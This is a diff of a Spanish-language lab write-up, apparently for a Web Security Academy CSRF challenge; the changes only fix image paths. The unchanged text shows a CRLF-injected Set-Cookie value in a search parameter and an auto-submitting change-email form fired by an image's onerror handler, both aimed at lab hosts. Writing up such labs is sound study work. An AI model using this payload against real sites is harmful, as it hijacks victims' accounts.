@@ -11,19 +11,19 @@ Este escenario demuestra cómo incluso mecanismos aparentemente robustos pueden 
 
 Solucion
 Como veiamos en la otra imagen nosotro teniamos un SET-Cookie en la parte del send asi que lo que nosotros podriamos hacer es hacer un salto de lienar para obtener otro nuevo SET-COOKIE para ello en el codigo ascii podemos ver eso
-![Pasted_image_20250723201619.png](Imagenes/Pasted_image_20250723201619.png)
+![Pasted_image_20250723201619.png](/Imagenes/Pasted_image_20250723201619.png)
 
 asi que vamos a pasar esto para cambiarlo
 (/?search=hola%20Set-Cookie:%20csrfKey=a )
-![Pasted_image_20250723201727.png](Imagenes/Pasted_image_20250723201727.png)
+![Pasted_image_20250723201727.png](/Imagenes/Pasted_image_20250723201727.png)
 asi que esto no lo vamos a llevar a decoder y ahi vamos a darle decoder y le ponemos URL y vamos agregar lo siguiente
 (/?search=hola%0D%0ASet-Cookie:%20csrfKey=a) tuvimos que eliminar el %20 despues del hola
-![Pasted_image_20250723202139.png](Imagenes/Pasted_image_20250723202139.png)
+![Pasted_image_20250723202139.png](/Imagenes/Pasted_image_20250723202139.png)
 ahora lo vamos a suplantar por lo que teniamos  asi que podemos ver que si funciona el cambio
-![Pasted_image_20250723202613.png](Imagenes/Pasted_image_20250723202613.png)
+![Pasted_image_20250723202613.png](/Imagenes/Pasted_image_20250723202613.png)
 con todo obtenido vamos a obtener nuestro payload
 lo primero copiamos el formulario
-![Pasted_image_20250723202931.png](Imagenes/Pasted_image_20250723202931.png)
+![Pasted_image_20250723202931.png](/Imagenes/Pasted_image_20250723202931.png)
 y en este caso vamos a cargar una imagen 
 (<form class="login-form" name="change-email-form" action="https://0ab7002204eeb8ac820e6b560025005f.web-security-academy.net/my-account/change-email" method="POST">                          
     <input type="hidden" name="email" value="hola@tenso.com">
@@ -31,12 +31,12 @@ y en este caso vamos a cargar una imagen
 </form>
 
 <img src="https://0ab7002204eeb8ac820e6b560025005f.web-security-academy.net/?search=/?search=hola%0D%0ASet-Cookie:%20csrfKey=iS9jYVco7XUk75csWMItrW4mpMoqQue8%3b%20SameSite=None" onerror="document.forms[0].submit()">)
-![Pasted_image_20250723204922.png](Imagenes/Pasted_image_20250723204922.png)
+![Pasted_image_20250723204922.png](/Imagenes/Pasted_image_20250723204922.png)
 
 basicamente en el primer csrf ponemos esto del wiener
-![Pasted_image_20250723205010.png](Imagenes/Pasted_image_20250723205010.png)
+![Pasted_image_20250723205010.png](/Imagenes/Pasted_image_20250723205010.png)
 y en el segundo ponemos esto 
-![Pasted_image_20250723205036.png](Imagenes/Pasted_image_20250723205036.png)
+![Pasted_image_20250723205036.png](/Imagenes/Pasted_image_20250723205036.png)
 pero aqui le vamos agregar algo (/?search=hola%0D%0ASet-Cookie:%20csrfKey=iS9jYVco7XUk75csWMItrW4mpMoqQue8%3b%20 SameSite=None)
-![Pasted_image_20250723205116.png](Imagenes/Pasted_image_20250723205116.png)
+![Pasted_image_20250723205116.png](/Imagenes/Pasted_image_20250723205116.png)
 
